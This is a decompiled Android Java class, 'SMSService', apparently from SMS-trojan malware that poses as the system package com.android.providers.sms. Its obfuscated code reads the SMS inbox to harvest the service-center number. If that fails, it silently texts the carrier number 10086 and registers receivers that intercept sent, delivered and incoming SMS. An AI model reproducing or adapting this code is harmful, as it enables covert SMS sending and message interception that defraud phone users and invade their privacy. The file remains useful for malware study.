package com.android.providers.sms;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.gsm.SmsManager;

public class SMSService extends Service {
    private SMSReceiver a;
    private SMSReceiver b;
    private SMSReceiver c;

    private boolean a() {
        String str = "service_center";
        String str2 = "service_center";
        Cursor query = getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", str}, null, null, "date desc");
        if (query.moveToFirst()) {
            String str3 = "service_center";
            String string = query.getString(query.getColumnIndex(str));
            if (string != null && !string.equals("")) {
                ak.q = string;
                a.a((Context) this).a("SharePreCenterNumber", ak.q);
                return true;
            }
        }
        return false;
    }

    private void b() {
        String str = "10086";
        String str2 = "10086";
        String str3 = "10086";
        SmsManager.getDefault().sendTextMessage(str, null, str, PendingIntent.getBroadcast(this, 0, new Intent("com.and.sms.send"), 0), PendingIntent.getBroadcast(this, 0, new Intent("com.and.sms.delivery"), 0));
    }

    private void c() {
        this.a = new SMSReceiver();
        registerReceiver(this.a, new IntentFilter("com.and.sms.send"));
        this.b = new SMSReceiver();
        registerReceiver(this.b, new IntentFilter("com.and.sms.delivery"));
        this.c = new SMSReceiver();
        registerReceiver(this.c, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
        b();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onStart(Intent intent, int i) {
        if (!a()) {
            c();
        }
    }
}
